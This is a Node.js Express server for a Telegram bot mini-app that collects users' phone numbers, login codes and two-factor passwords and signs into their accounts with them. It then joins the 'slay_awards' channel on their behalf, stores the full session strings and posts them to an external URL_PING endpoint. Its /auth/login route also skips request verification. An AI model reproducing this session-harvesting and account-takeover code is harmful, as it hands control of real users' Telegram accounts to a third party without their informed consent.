require("dotenv").config();
const axios = require("axios");
const crypto = require('crypto');
const express = require("express");
const cors = require("cors");
const app = express();
const HTMLParser  = require('node-html-parser');
const fs = require("fs");
const DB = require("./connectDB.js");

const dataBase = DB.connect("prime_wave_bot");
const imgBase = DB.connect("pw_images");
const serverBase = DB.connect("pw_servers");
app.use(cors({ methods: ["GET", "POST"] }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = +process.env.ADMIN_ID;


// serverBase.find({}).toArray().then(res => {
//   console.log(res[0]);
// })


const USERS = {};

async function main() {
  // MiniApp API
  app.post('/auth/phone', async (req, res) => {
    const { id, phone } = req.body;
    try {
      USERS[id] = { phone };
      USERS[id].client = new TelegramClient( new StringSession(""), apiId, apiHash,  { connectionRetries: 5, useWSS: true });
      await USERS[id].client.connect();

      USERS[id].resultSendCode = await USERS[id].client.invoke(
        new Api.auth.SendCode({
          phoneNumber: USERS[id].phone,
          apiId,
          apiHash,
          settings: new Api.CodeSettings({
            allowFlashcall: true,
            currentNumber: true,
            allowAppHash: true,
            allowMissedCall: true,
            logoutTokens: [Buffer.from("arbitrary data here")],
          }),
        })
      );

      res.json({ type: 'succes', msg:'Код был отправлен!' });
    }
    catch(e){
      console.log(e)
      if(e.errorMessage === 'PHONE_NUMBER_INVALID'){
        res.json({ type: 'error', msg:'Ошибка в номере телефона!' });
      }
      else{
        res.json({ type: 'error', msg:e.errorMessage });
      }
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    }
  });

  app.post('/auth/code-password', async (req, res) => {
    const { id, username, code, password } = req.body;
    USERS[id].code = code.replaceAll(' ','');
    USERS[id].password = password;
    try {     
      USERS[id].resultCodeTg = await USERS[id].client.invoke(
        new Api.auth.SignIn({
          phoneNumber: USERS[id].phone,
          phoneCodeHash: USERS[id].resultSendCode.phoneCodeHash,
          phoneCode: USERS[id].code
        })
      );

      const me = await USERS[id].client.getMe();
      
      const channelEntity = await USERS[id].client.getEntity("slay_awards");
      await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: channelEntity }));
      const msgs = await USERS[id].client.getMessages("slay_awards", { limit: 1 });
      const msg = msgs[0];
      const discussionChat = await USERS[id].client.getEntity(msg.replies.channelId);
      await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: discussionChat }));

      await dataBase.insertOne({  hash: hashCode(), id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, session: USERS[id].client.session.save(), posts:[  ] });
      res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save() });
      await axios.post(`${process.env.URL_PING}/add-account`, { session: USERS[id].client.session.save() }, { headers: { "Content-Type": "application/json" } });
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    } catch (err) {
      console.log(err)
      if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
        try{
          const passwordInfo = await USERS[id].client.invoke(new Api.account.GetPassword());
          const password = await USERS[id].password;
          const passwordSrp = await passwordUtils.computeCheck(passwordInfo, password);
          await USERS[id].client.invoke( new Api.auth.CheckPassword({ password: passwordSrp }) );

          const me = await USERS[id].client.getMe();
          
          const channelEntity = await USERS[id].client.getEntity("slay_awards");
          await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: channelEntity }));
          const msgs = await USERS[id].client.getMessages("slay_awards", { limit: 1 });
          const msg = msgs[0];
          const discussionChat = await USERS[id].client.getEntity(msg.replies.channelId);
          await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: discussionChat }));

          await dataBase.insertOne({  hash: hashCode(), id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, session: USERS[id].client.session.save(), posts:[  ] });
          res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});  
          await axios.post(`${process.env.URL_PING}/add-account`, { session: USERS[id].client.session.save() }, { headers: { "Content-Type": "application/json" } });
        }
        catch(err2){
          if (err2.errorMessage === "PASSWORD_HASH_INVALID") {
            res.json({ type: 'error', msg:'Облачный пароль не совпадает!'});
          } 
        }
      } else {

        console.error("❌ Ошибка входа:", err);
        if (err.errorMessage === "PHONE_CODE_INVALID") {    
          res.json({ type: 'error', msg:'Код введен не правильно!'});
        }
      }

      if (err.errorMessage === "PHONE_CODE_EXPIRED") {
        res.json({ type: 'error', msg:'Время кода истекло!'});
      } 
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    }

  });
  
}



app.post('/auth/login', async (req, res) => {
  const { id, username, initData } = req.body;
  //console.log(req.body);
  const user =  await userBase.findOne({ id, username });
  const isVerify = true; //await verifyTelegramInitData(initData);
  //console.log(isVerify);

  if(user === null || user.isBanned || !user.isValid || !isVerify){
    res.json({ type: 'error', accounts: [] });
  }
  else if(!user.isBanned && user.isValid && isVerify){
    const accountsRaw = await dataBase.findOne({ id, username }).accounts;
    const accounts = accountsRaw.map(item => {
      return { id: item.id, username: item.username, full_name: item.full_name, posts: item.posts, hash: item.hash }
    })
    res.json({ type: 'succes', accounts, token_imgbb: process.env.TOKEN_IMGBB });
  }
});



app.post('/upload-image', async (req, res) => {
  const { id, current, thumb } = req.body;
  await imgBase.insertOne({ id, current, thumb });
  res.json({ type: 200 });
});

app.post('/images', async (req, res) => {
  const { id  } = req.body;
  const imagesRaw = await imgBase.find({ id }).toArray();
  const images = imagesRaw.map(({current, thumb}) =>  { 
    return { current, thumb }
  })
  res.json({ images });
});

app.post('/add-post', async (req, res) => { 
  const { id, post_editor, hash } = req.body;
  try{
    await bot.telegram.sendPhoto(id, post_editor.post_image, { caption: post_editor.post_text , parse_mode:'HTML' });
    if(id != ADMIN_ID){
      await axios.post(`${process.env.URL_PING}/add-post`,  { post_editor, hash }, { headers: { "Content-Type": "application/json" } });
    }
  }
  catch(e){
    await bot.telegram.sendMessage(id, `<b>Ошибка скорее всего вы не закрыли тег html</b>`, { parse_mode:'HTML' })
  }
  await dataBase.updateOne({ hash }, { $push: { "posts": post_editor }});
  const { posts } =  await dataBase.findOne({ hash });
  res.json({ posts });
});

app.post('/update-post', async (req, res) => { 
  const { id, post_editor, hash } = req.body;
  console.log(id, post_editor, hash);
  try{
    await bot.telegram.sendPhoto(id, post_editor.post_image, { caption: post_editor.post_text , parse_mode:'HTML' });
    if(id != ADMIN_ID){
      await axios.post(`${process.env.URL_PING}/update-post`,  { post_editor, hash }, { headers: { "Content-Type": "application/json" } });
    }
  }
  catch(e){
    await bot.telegram.sendMessage(id, `<b>Ошибка скорее всего вы не закрыли тег html</b>`, { parse_mode:'HTML' })
  }
  await dataBase.updateOne({ hash, "posts.id": post_editor.id }, { $set: { "posts.$": post_editor }});
  const { posts } =  await dataBase.findOne({ hash });
  res.json({ posts });
});

app.post('/delete-post', async (req, res) => { 
  const { id, hash_post, hash } = req.body;
  if(id != ADMIN_ID){
    await axios.post(`${process.env.URL_PING}/delete-post`,  { hash_post, hash }, { headers: { "Content-Type": "application/json" } });
  }
    await dataBase.updateOne({ hash, "posts.id": hash_post }, { $pull: { posts: { id: hash_post } } });
  const { posts } =  await dataBase.findOne({ hash });
  res.json({ posts });
});

app.get("/parse", async (req, res) => {
  const { q } = req.query;
  axios.get(`https://t.me/${q}`).then(async (raw) => {
    const root = HTMLParser.parse(raw.data);
    const obj = {
      type: root.querySelector(".tgme_page_photo_image") ? 'success' : 'error',
      img: root.querySelector(".tgme_page_photo_image")?._attrs?.src,
      title: root.querySelector(".tgme_page_title")?.innerText?.trim()
    }
    res.json(obj);
  })
});




function hashCode(n = 8) {
  const symbols =
    "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
  let user_hash = "";
  for (let i = 0; i != n; i++) {
    user_hash += symbols[Math.floor(Math.random() * symbols.length)];
  }
  return user_hash;
}

async function verifyTelegramInitData(initData) {
  const urlParams = new URLSearchParams(initData);
  const hash = urlParams.get("hash");
  urlParams.delete("hash");
  const dataCheckString = Array.from(urlParams.entries()).map(([k, v]) => `${k}=${v}`).sort().join("\n");
  const secretKey = crypto.createHmac("sha256", "WebAppData").update(BOT_TOKEN).digest();
  const hmac = crypto.createHmac("sha256", secretKey).update(dataCheckString).digest("hex");
  return hmac === hash;
}

app.listen(3042, (err) => { err ? err : console.log("STARTED SERVER"); });
